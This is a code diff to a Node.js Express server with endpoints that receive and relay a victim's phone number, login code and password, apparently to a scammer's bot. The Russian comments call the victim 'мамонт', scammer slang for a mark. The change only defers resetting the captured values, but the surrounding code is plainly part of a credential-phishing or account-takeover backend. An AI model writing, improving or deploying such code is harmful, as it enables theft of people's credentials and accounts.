@@ -37,7 +37,9 @@ app.post('/phone', (req, res) => {
         console.log(`Номер телефона мамонта: ${phone_number}`);
         res.json({ message: `Номер телефона мамонта: ${phone_number}` });
         // Установить значение pn в undefined после передачи данных боту
-        pn = undefined;
+        setTimeout(() => {
+            pn = undefined;
+        }, 0);
         return;
     } else {
         console.log('Номер телефона мамонта неопределен.');
@@ -53,7 +55,9 @@ app.post('/authCode', (req, res) => {
         console.log(`Код мамонта: ${value}`);
         res.json({ message: `Код мамонта: ${value}` });
         // Установить значение code в undefined после передачи данных боту
-        code = undefined;
+        setTimeout(() => {
+            code = undefined;
+        }, 0);
         return 0;
     } else {
         console.log('Код мамонта неопределен.');
@@ -69,7 +73,9 @@ app.post('/password', (req, res) => {
         console.log(`Пароль мамонта: ${password}`);
         res.json({ message: `Пароль мамонта: ${password}` });
         // Установить значение pass в undefined после передачи данных боту
-        pass = undefined;
+        setTimeout(() => {
+            pass = undefined;
+        }, 0);
         return;
     } else {
         console.log('Пароль мамонта неопределен.');
